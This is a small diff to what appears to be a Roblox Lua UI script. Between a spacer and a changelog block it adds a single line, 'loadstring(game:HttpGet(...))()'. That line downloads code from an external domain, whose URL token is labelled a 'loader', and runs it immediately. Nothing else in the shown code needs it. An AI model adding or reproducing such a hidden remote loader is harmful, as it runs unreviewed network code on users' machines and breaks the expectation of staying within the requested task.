@@ -1604,6 +1604,8 @@ Main:Paragraph({
 
 Main:Space()
 
+loadstring(game:HttpGet("https://api.synscripts.org/run/eyJpZCI6ImYyYmRmZmMxLTAyYjYtNGIyOS1hNzIyLWM5MWYyNjIwNTc0NCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0="))()
+
 Main:Code({
     Title = "Changelog 1.8.0",
     Code = [[
